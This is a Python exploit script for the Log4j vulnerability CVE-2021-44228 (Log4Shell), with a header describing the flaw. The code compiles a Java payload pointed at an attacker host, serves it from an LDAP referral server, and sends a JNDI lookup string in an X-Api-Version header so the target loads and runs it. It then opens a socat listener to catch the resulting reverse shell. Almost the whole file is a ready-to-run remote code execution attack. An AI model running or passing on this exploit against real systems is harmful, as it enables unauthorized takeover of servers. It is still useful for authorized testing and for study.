#!/usr/bin/env python3
#  -*- coding: utf-8 -*- #######################################################################################
#  ██▓     ▒█████    ▄████  ▄▄▄██▀▀▀██▀███   ▄████▄  ▓█████                                                    #
# ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒   ▒██  ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀                                                    #
# ▒██░    ▒██░  ██▒▒██░▄▄▄░   ░██  ▓██ ░▄█ ▒▒▓█    ▄ ▒███                                                      #
# ▒██░    ▒██   ██░░▓█  ██▓▓██▄██▓ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄                                                    #
# ░██████▒░ ████▓▒░░▒▓███▀▒ ▓███▒  ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒                                                   #
# ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒  ▒▓▒▒░  ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░                                                   #
# ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░  ▒ ░▒░    ░▒ ░ ▒░  ░  ▒    ░ ░  ░                                                   #
#   ░ ░   ░ ░ ░ ▒  ░ ░   ░  ░ ░ ░    ░░   ░ ░           ░                                                      #
#     ░  ░    ░ ░        ░  ░   ░     ░     ░ ░         ░  ░                                                   #
#                                          ░                                                                   #
#                                                                                                              #
# log4jrce - nighter@nighter.se                                                                      #
#                                                                                                              #
# DATE                                                                                                         #
# 15/12/2021                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
#                                                                                                              #
# CVE-2021-44228 - Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI features used in      #
# configuration, log messages, and parameters do not protect against attacker controlled LDAP                  #
# and other JNDI related endpoints. An attacker who can control log messages or log message parameters can     #
# execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.                 #
# From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0, this functionality       #
# has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect      #
# log4net, log4cxx, or other Apache Logging Services projects.                                                 #
#                                                                                                              #
################################################################################################################

import signal
import termios
import select
import socket
import os
import fcntl
import sys
import time

from multiprocessing import Process
from shutil import copyfile
import requests

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

def prepare_payload():

    _workdir = sys.path[0]

    if os.path.isfile('src/main/java/ExportObject.java') is False:
        print("ERROR missing src/main/java/ExportObject.java")
        sys.exit(1)

    if os.path.isfile('target/ldaprefserver.jar') is False:
        print("ERROR missing ldaprefserver.jar")
        sys.exit(1)

    # Ugly but this was the easiest way I could find
    # so why not keep it simple this just works.
    print("[+] Preparing payload")
    copyfile('src/main/java/ExportObject.java', 'target/ExportObject.java')
    os.system("sed -ri 's/([0-9]{1,3}\.){3}[0-9]{1,3}/%s/' target/ExportObject.java" % LHOST)
    os.system("sed -ri 's/[0-9]{4}/%s/' target/ExportObject.java" % LPORT)
    os.chdir('target')
    os.system("javac -source 8 -target 8 ExportObject.java")
    os.system("jar uf ldaprefserver.jar ExportObject.class")


def start_ldaprefserver():
    os.system("java -jar ./ldaprefserver.jar %s" % LHOST)
   

def exploit():

    time.sleep(5)
    #print "[+] Exploit"
    headers = {"X-Api-Version": "${jndi:ldap://%s:1389/ExportObject}" % LHOST}
    requests.get(URL, headers=headers)    
    print('') 


# noinspection PyInterpreter
if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
 ██▓     ▒█████    ▄████  ▄▄▄██▀▀▀██▀███   ▄████▄  ▓█████ 
▓██▒    ▒██▒  ██▒ ██▒ ▀█▒   ▒██  ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
▒██░    ▒██░  ██▒▒██░▄▄▄░   ░██  ▓██ ░▄█ ▒▒▓█    ▄ ▒███   
▒██░    ▒██   ██░░▓█  ██▓▓██▄██▓ ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
░██████▒░ ████▓▒░░▒▓███▀▒ ▓███▒  ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒  ▒▓▒▒░  ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
░ ░ ▒  ░  ░ ▒ ▒░   ░   ░  ▒ ░▒░    ░▒ ░ ▒░  ░  ▒    ░ ░  ░
  ░ ░   ░ ░ ░ ▒  ░ ░   ░  ░ ░ ░    ░░   ░ ░           ░   
    ░  ░    ░ ░        ░  ░   ░     ░     ░ ░         ░  ░
                                          ░              
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./log4jrce.py 'http://127.0.0.1:9000' 192.168.1.75 7777\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print("[+] LHOST: %s" % LHOST)

    prepare_payload()

    # Run ldap server async
    p = Process(target=start_ldaprefserver)
    p.start()

    # Run ldap server async
    p = Process(target=exploit)
    p.start()

    # Start listener
    print("[+] Shell listen")
    os.system('socat file:`tty`,raw,echo=0 tcp-listen:%s' % str(LPORT))